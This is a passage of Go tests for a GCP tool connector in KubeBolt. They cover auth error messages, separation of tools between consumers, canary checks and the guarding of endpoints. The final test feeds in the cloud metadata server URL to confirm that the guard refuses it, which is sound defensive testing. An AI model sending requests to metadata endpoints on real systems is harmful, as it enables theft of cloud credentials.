	}
}

func TestGCPUnauthorizedIsAHumanError(t *testing.T) {
	f := gcpFilterFake(t)
	f.callStatus = http.StatusUnauthorized
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	res, err := bd.Call(t.Context(), ConsumerKobi, "container_list_clusters", json.RawMessage(`{"parent":"projects/`+gcpTestProject+`/locations/-"}`))
	if err == nil {
		t.Fatalf("expected an error, got %+v", res)
	}
	if !errors.Is(err, mcpclient.ErrUnauthorized) {
		t.Fatalf("the gateway must still see ErrUnauthorized: %v", err)
	}
	if !strings.Contains(err.Error(), "rejected the connector's credentials") || strings.Contains(err.Error(), gcpTestToken) {
		t.Fatalf("message = %q", err.Error())
	}
	if res.Audit["endpoint"] == nil {
		t.Fatalf("audit = %v", res.Audit)
	}

	tr, err := bd.Test(t.Context())
	if err != nil || tr.OK || tr.Canary == nil || tr.Canary.OK || !strings.Contains(tr.Error, "rejected the credentials") || tr.Hint == "" {
		t.Fatalf("test = %+v, %v", tr, err)
	}

	f.callStatus = http.StatusForbidden
	_, err = bd.Call(t.Context(), ConsumerKobi, "sqladmin_list_instances", nil)
	var httpErr *mcpclient.HTTPError
	if !errors.As(err, &httpErr) || httpErr.Status != 403 || !strings.Contains(err.Error(), "roles/mcp.toolUser") {
		t.Fatalf("403: %v", err)
	}
}

func TestGCPConsumerSeparation(t *testing.T) {
	f := newGCPFake(t, gcpSnapshotTools(t))
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	kobi, auto := gcpSpecNames(bd.Tools(ConsumerKobi)), gcpSpecNames(bd.Tools(ConsumerAutopilot))
	var kobiOnly []string
	for _, k := range kobi {
		if !slices.Contains(auto, k) {
			kobiOnly = append(kobiOnly, k)
		}
	}
	if len(kobiOnly) == 0 {
		t.Fatal("expected Kobi-only tools")
	}
	for _, name := range kobiOnly {
		res, err := bd.Call(t.Context(), ConsumerAutopilot, name, nil)
		if err != nil || !res.IsError {
			t.Errorf("autopilot called %s: %+v %v", name, res, err)
		}
	}
	for _, name := range []string{"", "mcp__gcp__sqladmin_list_instances", "sqladmin_execute_sql_readonly", "unknown"} {
		if res, _ := bd.Call(t.Context(), ConsumerKobi, name, nil); !res.IsError {
			t.Errorf("%q was called", name)
		}
	}
	if res, _ := bd.Call(t.Context(), Consumer("someone"), "sqladmin_list_instances", nil); !res.IsError {
		t.Error("an unknown consumer called a tool")
	}
	if n := len(f.calls()); n != 0 {
		t.Fatalf("%d refused calls reached Google", n)
	}
	if len(bd.Tools(Consumer("someone"))) != 0 {
		t.Fatal("an unknown consumer got tools")
	}
}

func TestGCPToolsAreDeterministicCopies(t *testing.T) {
	f := newGCPFake(t, gcpSnapshotTools(t))
	a := f.bind(t, gcpTestResolved(gcpTestProject))
	b := f.bind(t, gcpTestResolved(gcpTestProject))
	ja, _ := json.Marshal(a.Tools(ConsumerKobi))
	jb, _ := json.Marshal(b.Tools(ConsumerKobi))
	if string(ja) != string(jb) {
		t.Fatal("two binds of the same configuration produced different tool lists")
	}
	names := gcpSpecNames(a.Tools(ConsumerKobi))
	if !sort.StringsAreSorted(names) {
		t.Fatalf("not sorted: %v", names)
	}
	first := a.Tools(ConsumerKobi)
	gcpSchemaProps(first[0].InputSchema)["injected"] = map[string]any{"type": "string"}
	first[0].InputSchema["required"] = []any{"injected"}
	jc, _ := json.Marshal(a.Tools(ConsumerKobi))
	if string(jc) != string(ja) {
		t.Fatal("editing a returned schema changed the binding")
	}
}

func TestGCPTestCanary(t *testing.T) {
	f := gcpFilterFake(t)
	f.callResult = func(service, tool string) map[string]any {
		return map[string]any{"content": []any{}, "structuredContent": map[string]any{"clusters": []any{}}}
	}
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	tr, err := bd.Test(t.Context())
	if err != nil || !tr.OK || tr.Canary == nil || !tr.Canary.OK || tr.Canary.Tool != "container_list_clusters" {
		t.Fatalf("test = %+v, %v", tr, err)
	}
	if tr.Identity != gcpTestSA || tr.Tools != len(bd.Tools(ConsumerKobi)) {
		t.Fatalf("identity %q, tools %d", tr.Identity, tr.Tools)
	}
	calls := f.calls()
	if len(calls) != 1 || calls[0].tool != "list_clusters" || calls[0].args["parent"] != "projects/"+gcpTestProject+"/locations/-" {
		t.Fatalf("canary = %+v", calls)
	}
	// A reply with only structuredContent is not an empty answer.
	res, err := bd.Call(t.Context(), ConsumerKobi, "sqladmin_list_instances", nil)
	if err != nil || !strings.Contains(res.Text, `"clusters"`) {
		t.Fatalf("structured-only reply: %+v %v", res, err)
	}

	f.callResult = func(string, string) map[string]any {
		return map[string]any{"isError": true, "content": []any{map[string]any{"type": "text", "text": "Permission 'container.clusters.list' denied"}}}
	}
	tr, _ = bd.Test(t.Context())
	if tr.OK || !strings.Contains(tr.Error, "container.clusters.list") || !strings.Contains(tr.Hint, "roles/container.viewer") {
		t.Fatalf("denied canary = %+v", tr)
	}
}

// A token that cannot be minted fails before anything is sent, and the
// admin is told what Google's token endpoint said.
func TestGCPTokenFailureIsExplained(t *testing.T) {
	f := gcpFilterFake(t)
	b := f.binder(t)
	b.tokenSource = func(context.Context, Resolved, Env) (oauth2.TokenSource, error) {
		return gcpFailingTokens{}, nil
	}
	bound, err := b.Bind(t.Context(), gcpTestResolved(gcpTestProject), f.env(t))
	if err != nil {
		t.Fatalf("listing is unsigned, so a bad token must not stop the bind: %v", err)
	}
	bd := bound.(*gcpBinding)
	defer bd.Close(context.Background())
	_, err = bd.Call(t.Context(), ConsumerKobi, "sqladmin_list_instances", nil)
	if err == nil || !strings.Contains(err.Error(), "could not get an access token") || !strings.Contains(err.Error(), "invalid_grant") {
		t.Fatalf("err = %v", err)
	}
	tr, _ := bd.Test(t.Context())
	if tr.OK || !strings.Contains(tr.Hint, "paste a new key") {
		t.Fatalf("test = %+v", tr)
	}
	if n := len(f.calls()); n != 0 {
		t.Fatalf("%d calls went out without a token", n)
	}
}

// A failed test's hint speaks to how the connector signs in. A service
// account key can be pasted again; with Application Default Credentials
// there is no key, so the hint points at the identity KubeBolt runs as.
func TestGCPTestHintsFollowTheAuthMode(t *testing.T) {
	failing := func(context.Context, Resolved, Env) (oauth2.TokenSource, error) {
		return gcpFailingTokens{}, nil
	}
	adc := gcpTestResolved(gcpTestProject)
	adc.Mode, adc.Secrets = gcpModeADC, nil
	identity := []string{"identity KubeBolt runs as", "Workload Identity", "metadata server", "application default credentials"}
	for _, c := range []struct {
		name   string
		r      Resolved
		tokens func(context.Context, Resolved, Env) (oauth2.TokenSource, error)
		status int
		want   []string
		never  []string
	}{
		{"key, no token", gcpTestResolved(gcpTestProject), failing, 0, []string{"paste a new key", "oauth2.googleapis.com"}, nil},
		{"key, 401", gcpTestResolved(gcpTestProject), gcpStaticTokens, http.StatusUnauthorized, []string{"paste a new key"}, nil},
		{"adc, no token", adc, failing, 0, append([]string{"application-default login", "oauth2.googleapis.com"}, identity...), []string{"key", "paste"}},
		{"adc, 401", adc, gcpStaticTokens, http.StatusUnauthorized, identity, []string{"key", "paste"}},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := gcpFilterFake(t)
			f.callStatus = c.status
			b := f.binder(t)
			b.tokenSource = c.tokens
			env := f.env(t)
			env.AmbientAllowed = true
			bound, err := b.Bind(t.Context(), c.r, env)
			if err != nil {
				t.Fatalf("bind: %v", err)
			}
			bd := bound.(*gcpBinding)
			defer bd.Close(context.Background())
			tr, err := bd.Test(t.Context())
			if err != nil || tr.OK || tr.Canary == nil || tr.Canary.OK || tr.Error == "" {
				t.Fatalf("test = %+v, %v", tr, err)
			}
			for _, w := range c.want {
				if !strings.Contains(tr.Hint, w) {
					t.Errorf("hint %q does not say %q", tr.Hint, w)
				}
			}
			for _, n := range c.never {
				if strings.Contains(strings.ToLower(tr.Hint), n) {
					t.Errorf("hint %q says %q", tr.Hint, n)
				}
			}
		})
	}
}

// gcpHumanError reaches the model (Call) and the admin (Test's Error line):
// in ADC mode there is no key to revoke and the identity may be a user.
func TestGCPErrorsFollowTheAuthMode(t *testing.T) {
	unauthorized := fmt.Errorf("list: %w", mcpclient.ErrUnauthorized)
	forbidden := &mcpclient.HTTPError{Status: http.StatusForbidden}
	for _, c := range []struct {
		mode, want, never string
		err               error
	}{
		{gcpModeServiceAccount, "service account key may be revoked", "", unauthorized},
		{gcpModeADC, "identity KubeBolt runs as was refused", "key", unauthorized},
		{gcpModeServiceAccount, "the service account is missing roles/mcp.toolUser", "", forbidden},
		{gcpModeADC, "the identity KubeBolt runs as is missing roles/mcp.toolUser", "service account", forbidden},
	} {
		msg := gcpHumanError("container.googleapis.com", c.mode, c.err).Error()
		if !strings.Contains(msg, c.want) {
			t.Errorf("%s: %q does not say %q", c.mode, msg, c.want)
		}
		if c.never != "" && strings.Contains(msg, c.never) {
			t.Errorf("%s: %q says %q", c.mode, msg, c.never)
		}
	}
}

type gcpFailingTokens struct{}

func (gcpFailingTokens) Token() (*oauth2.Token, error) {
	return nil, errors.New(`oauth2: "invalid_grant" "Invalid JWT Signature."`)
}

func TestGCPPartialListing(t *testing.T) {
	f := gcpFilterFake(t)
	f.listFail["redis"] = http.StatusInternalServerError
	bd := f.bind(t, gcpTestResolved(gcpTestProject))
	if !reflect.DeepEqual(bd.missing, []string{"redis"}) {
		t.Fatalf("missing = %v", bd.missing)
	}
	for _, s := range bd.Tools(ConsumerKobi) {
		if strings.HasPrefix(s.Name, "redis_") {
			t.Fatalf("%s bound although redis could not be listed", s.Name)
		}
	}
	tr, _ := bd.Test(t.Context())
	if !tr.OK || !strings.Contains(tr.Hint, "redis") {
		t.Fatalf("test = %+v", tr)
	}

	dead := newGCPFake(t, nil)
	for _, s := range gcpServices {
		dead.listFail[s.id] = http.StatusServiceUnavailable
	}
	if _, err := dead.binder(t).Bind(t.Context(), gcpTestResolved(gcpTestProject), dead.env(t)); err == nil {
		t.Fatal("bound with no endpoint listed")
	}
}

// The guard admits nothing but the endpoints it was told about: a binding
// cannot be pointed at the metadata server or a private address.
func TestGCPBindRefusesUnguardedEndpoints(t *testing.T) {
	b := gcpBinder{
		endpointURL: func(string) string { return "http://169.254.169.254/computeMetadata/v1/mcp" },
		tokenSource: gcpStaticTokens,
		logger:      gcpTestLogger(t),
	}
	if _, err := b.Bind(t.Context(), gcpTestResolved(gcpTestProject), Env{}); err == nil {
		t.Fatal("bound against the metadata server")
	}
}
